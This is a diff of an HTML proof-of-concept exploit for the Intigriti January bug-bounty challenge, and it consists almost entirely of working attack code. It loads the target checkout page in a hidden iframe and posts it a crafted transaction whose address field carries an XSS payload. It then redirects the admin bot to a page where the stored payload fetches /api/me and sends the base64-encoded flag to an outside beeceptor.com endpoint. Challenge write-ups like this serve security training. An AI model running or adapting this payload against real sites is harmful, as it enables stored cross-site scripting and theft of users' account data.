@@ -1,30 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        button { width: 100%; height: 100vh; font-size: 50px; cursor: pointer; }
-    </style>
+    <title>Intigriti Jan Challenge PoC</title>
 </head>
-<body>
-    <button id="exploit">CLICK TO VIEW REPORT</button>
-    <script>
-        const challengeDomain = "https://challenge-0126.intigriti.io";
-        const beeceptor = "https://kavil.free.beeceptor.com";
-        const xss = `"><svg/onload="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;
+<body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>Exploit Initializing...</h1>
+    <p>Performing security bypass, please wait.</p>
 
-        document.getElementById('exploit').onclick = function() {
-            // Open checkout in a new tab/window
-            const win = window.open(`${challengeDomain}/checkout.html?currency=1337COIN&price=1`);
+    <script>
+        // --- CONFIGURATION ---
+        const challengeDomain = "https://challenge-0126.intigriti.io";
+        // REPLACE 'YOUR_ENDPOINT' WITH YOUR ACTUAL BEECEPTOR NAME
+        const beeceptor = "https://kavil.free.beeceptor.com";
+        
+        // --- THE PAYLOAD ---
+        // 1. Breaks out of the title attribute: ">
+        // 2. Injects SVG to execute JS
+        // 3. Fetches /api/me to get the flag
+        // 4. Sends flag to your Beeceptor
+        const xssPayload = `"><svg/onload="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;
+
+        // --- THE EXPLOIT FLOW ---
+        
+        // 1. Create a hidden iframe to the checkout page
+        const iframe = document.createElement('iframe');
+        // Targeting 1337COIN because the Admin Bot has a high balance
+        iframe.src = `${challengeDomain}/checkout.html?currency=1337COIN&price=1`;
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+
+        iframe.onload = () => {
+            console.log("Iframe loaded. Triggering CSRF...");
             
+            // 2. Wait 1 second to ensure the checkout.html listener is ready
             setTimeout(() => {
-                win.postMessage({
+                iframe.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: xss,
+                        toAddress: xssPayload,
                         currency: '1337COIN',
                         amount: 0.000001
                     }
                 }, '*');
+
+                console.log("Message sent. Redirecting to trigger XSS...");
+
+                // 3. Redirect the bot to MarketWatch where the transaction is now stored
+                setTimeout(() => {
+                    window.location.href = `${challengeDomain}/marketwatch.html`;
+                }, 2000);
+            }, 1000);
         };
     </script>
 </body>
